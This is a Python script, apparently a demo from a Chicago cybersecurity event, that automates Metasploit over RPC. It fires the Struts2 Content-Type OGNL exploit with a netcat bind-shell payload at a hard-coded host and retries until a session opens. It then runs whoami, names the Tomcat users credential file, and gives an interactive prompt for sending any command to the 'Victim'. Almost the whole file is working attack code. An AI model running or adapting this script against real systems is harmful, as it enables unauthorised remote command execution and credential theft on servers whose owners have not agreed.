#!/usr/bin/env python

from metasploit.msfrpc import MsfRpcClient
import os
import json

#----------------------------------------------------------------------------------------
# setting metasploit variables
metasploit_login = os.environ['metasploit_login_id']
exploit_module = "exploit/multi/http/struts2_content_type_ognl"
payload = "cmd/unix/bind_netcat"
remote_ip = "192.168.1.65"
hotspot = "172.20.10.6"
remote_port = "8080"
target_uri = "/struts2_2.3.15.1-showcase/showcase.action"
sessionid = 0
active_shell = True

#----------------------------------------------------------------------------------------

print ("Creating a metasploit service...\n")
# create a metasploit object
msfrpc_obj = MsfRpcClient(metasploit_login)
if msfrpc_obj:
    print ("Successfully created client service...")
else:
    print ("Oops! Something went wrong...")

# create a metasploit modules object
exploit_list = msfrpc_obj.modules.exploits

print ("starting attack on victim: ", remote_ip)
exploit = msfrpc_obj.modules.use('exploit', exploit_module)
exploit['RHOSTS'] = remote_ip
exploit['RPORT'] = remote_port
exploit['TARGETURI'] = target_uri
exploit['VERBOSE']= False
exploit.execute(payload=payload)

session_list = msfrpc_obj.sessions.list
data = json.dumps(session_list)
current_session = data[2:3]
if not current_session:
    print ("There is no Metasploit sessions...")
    pass
else:
    print ("Current Metasploit sessionID: ", current_session)
    current_session = int(current_session)

while (not current_session) or (current_session == 0):
    exploit.execute(payload=payload)
    print ("Creating a new Metasploit session...")
    session_list = msfrpc_obj.sessions.list
    data = json.dumps(session_list)
    current_session = data[2:3]
    current_session = int(current_session)
    print ("Metasploit sessionID: ", current_session)

print ("Interactive shell's active... Quit anytime by typing 'exit'")
if current_session >= 1:
    sessionid = current_session
    shell = msfrpc_obj.sessions.session(sessionid)
    shell.write('whoami\n')
    print ("\n\nCurrent user: ", shell.read())
    print ("Tomcat Users Location: /usr/local/tomcat/conf/tomcat-users.xml")
    print ("\n")
else:
    print ("Oops! something went wrong! Check sessionID")
    quit()

while active_shell:
    interactive_shell = input('What would you like to do to Victim?: ')
    if "ssh" in interactive_shell:
        dump_ssh_key = "yourssh_key"
        ssh_shell = msfrpc_obj.sessions.session(sessionid)
        ssh_shell.write(dump_ssh_key +'\n')
        
    elif ("exit" not in interactive_shell) or (not interactive_shell):
        

        new_shell = msfrpc_obj.sessions.session(sessionid)
        new_shell.write(interactive_shell +'\n')
        print ("command results: ", new_shell.read())
    else:
        active_shell = False
    
print ("Exiting script now...\n")
print ("Thank you for using Chicago CyberSecurity Demo script...")
quit()